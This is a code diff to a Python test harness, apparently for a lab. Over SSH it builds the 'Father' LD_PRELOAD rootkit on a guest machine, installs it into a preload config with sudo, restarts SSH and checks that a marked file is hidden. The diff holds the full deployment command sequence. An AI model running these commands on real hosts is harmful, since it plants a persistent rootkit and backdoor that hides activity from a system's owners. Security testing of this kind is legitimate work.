@@ -34,34 +34,15 @@ HIDDEN_PREFIX = "__malicious_"
 HIDDEN_FILE_NAME = f"{HIDDEN_PREFIX}file"
 LIST_HIDDEN_DIR = 'ls -la -- "$hidden_dir"'
 
-COMMAND_GROUPS = (
-    (
-        "prepare and build",
-        (
-            f"root={REMOTE_ROOT}; "
-            'source="$root/Father-4eb2712caf612a7dc55fd4f34ff5c72b74c7c332"; '
-            'hidden_dir="$root/probe"',
-            'mkdir -p "$hidden_dir"',
-            f'tar -xf {UPLOAD_PATH} -C "$root"',
-            f"sed -i 's|^#define STRING .*|#define STRING "
-            f'"{HIDDEN_PREFIX}"|\' "$source/src/config.h"',
-            'cd "$source" && make father',
-        ),
-    ),
-    (
-        "install and activate",
-        (
-            f'sudo -n install -m 0644 "$source/rk.so" {INSTALLED_LIBRARY}',
-            f'touch "$hidden_dir/{HIDDEN_FILE_NAME}"',
-            LIST_HIDDEN_DIR,
-            f"printf '%s\\n' {INSTALLED_LIBRARY} " f"| sudo -n tee {PRELOAD_CONFIG}",
-            "sudo -n systemctl restart ssh.service",
-        ),
-    ),
-    (
-        "validate behavior",
-        (LIST_HIDDEN_DIR,),
-    ),
+PREPARE_AND_BUILD_COMMANDS = (
+    f"root={REMOTE_ROOT}; "
+    'source="$root/Father-4eb2712caf612a7dc55fd4f34ff5c72b74c7c332"; '
+    'hidden_dir="$root/probe"',
+    'mkdir -p "$hidden_dir"',
+    f'tar -xf {UPLOAD_PATH} -C "$root"',
+    f"sed -i 's|^#define STRING .*|#define STRING "
+    f'"{HIDDEN_PREFIX}"|\' "$source/src/config.h"',
+    'cd "$source" && make father',
 )
 
 CLEANUP_COMMANDS = (
@@ -93,29 +74,39 @@ def run_father(
     _upload_archive(ssh, command_log_path)
 
     terminal = ssh.open_terminal()
-    listings: list[str] = []
     cleanup_facts = {}
 
     try:
         with terminal:
-            for label, commands in COMMAND_GROUPS:
-                console.scope("GUEST", label)
-                for command in commands:
-                    result = run_logged_command(
-                        terminal,
-                        command_log_path,
-                        command,
-                        timeout=180,
-                    )
-                    if command == LIST_HIDDEN_DIR:
-                        listings.append(result.combined_output)
+            console.scope("GUEST", "prepare and build")
+            for command in PREPARE_AND_BUILD_COMMANDS:
+                run_logged_command(terminal, command_log_path, command, timeout=180)
 
-            if (
-                len(listings) != 2
-                or HIDDEN_FILE_NAME not in listings[0]
-                or HIDDEN_FILE_NAME in listings[1]
+            console.scope("GUEST", "install and activate")
+            for command in (
+                f'sudo -n install -m 0644 "$source/rk.so" {INSTALLED_LIBRARY}',
+                f'touch "$hidden_dir/{HIDDEN_FILE_NAME}"',
             ):
-                raise RuntimeError("Father did not hide the controlled file as expected")
+                run_logged_command(terminal, command_log_path, command, timeout=180)
+
+            visible_listing = run_logged_command(
+                terminal, command_log_path, LIST_HIDDEN_DIR, timeout=180
+            ).combined_output
+            if HIDDEN_FILE_NAME not in visible_listing:
+                raise RuntimeError("Controlled file was not visible before activation")
+
+            for command in (
+                f"printf '%s\\n' {INSTALLED_LIBRARY} " f"| sudo -n tee {PRELOAD_CONFIG}",
+                "sudo -n systemctl restart ssh.service",
+            ):
+                run_logged_command(terminal, command_log_path, command, timeout=180)
+
+            console.scope("GUEST", "validate behavior")
+            hidden_listing = run_logged_command(
+                terminal, command_log_path, LIST_HIDDEN_DIR, timeout=180
+            ).combined_output
+            if HIDDEN_FILE_NAME in hidden_listing:
+                raise RuntimeError("Controlled file remained visible after activation")
 
             console.scope("HOST", "validate Father backdoor")
             try:
